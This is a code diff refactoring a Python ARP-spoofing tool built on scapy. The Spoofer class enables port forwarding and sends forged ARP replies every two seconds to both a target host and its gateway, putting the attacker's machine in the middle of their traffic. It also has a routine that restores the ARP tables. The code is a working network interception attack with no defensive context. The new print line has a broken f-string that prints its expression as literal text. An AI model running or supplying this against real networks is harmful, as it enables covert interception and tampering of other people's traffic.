@@ -23,8 +23,8 @@ class Spoofer:
     def __init__(self, target_ip, gateway_ip):
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
-        self.dest_mac = self.resolve_mac_from_ip(self.target_ip)
-        self.src_mac = self.resolve_mac_from_ip(self.gateway_ip)
+        self.target_mac = self.resolve_mac_from_ip(self.target_ip)
+        self.gateway_mac = self.resolve_mac_from_ip(self.gateway_ip)
         self.run(self.target_ip, self.gateway_ip)
         
     def resolve_mac_from_ip(self, ip_address):
@@ -39,34 +39,31 @@ class Spoofer:
 
         return acknowledged_list[0][1].hwsrc
         
-    def spoof(self, target_ip, spoof_ip):
+    def spoof(self, target_ip, spoof_ip, target_ip_mac):
         """
         Accepts as input the target IP and the spoof IP.
         Sends packets to manipulate the target's
         IP tables to associate the controller with the spoof IP.
         """
-        arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=self.dest_mac, psrc=spoof_ip)
+        arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_ip_mac, psrc=spoof_ip)
         scapy.send(arp_response_packet, verbose=False)
 
-    def restore_defaults(self, dest_ip, src_ip):
+    def restore_defaults(self, target_ip, gateway_ip, target_mac, gateway_mac):
         """
         Restores target(s) ARP tables.
-        TODO fix resolve so it isnt being called again. Not necessary here.
         """
-        dest_mac = self.resolve_mac_from_ip(dest_ip)
-        src_mac = self.resolve_mac_from_ip(src_ip)
-        arp_packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
+        arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
         scapy.send(arp_packet, count=4, verbose=False)
 
     def run(self, target_ip, gateway_ip):
         enable_port_fwd()
         sent_packets_count = 0
         while True:
-            self.spoof(target_ip, gateway_ip) # client, I am the router
-            self.spoof(gateway_ip, target_ip) # router, I am the client
-            # python3 #print(f"\r[+] Transaction successful. Packets sent: str(sent_packets_count)", end="")
+            self.spoof(target_ip, gateway_ip, self.target_mac) # client, I am the router
+            self.spoof(gateway_ip, target_ip, self.gateway_mac) # router, I am the client
             sent_packets_count += 2
-            print("\r[+] Transaction successful. Packets sent: " + str(sent_packets_count)),
+            print(f"\r[+] Transaction successful. Packets sent: str(sent_packets_count)", end="")
+            #python2 print("\r[+] Transaction successful. Packets sent: " + str(sent_packets_count)),
             sys.stdout.flush()
             time.sleep(2)
 
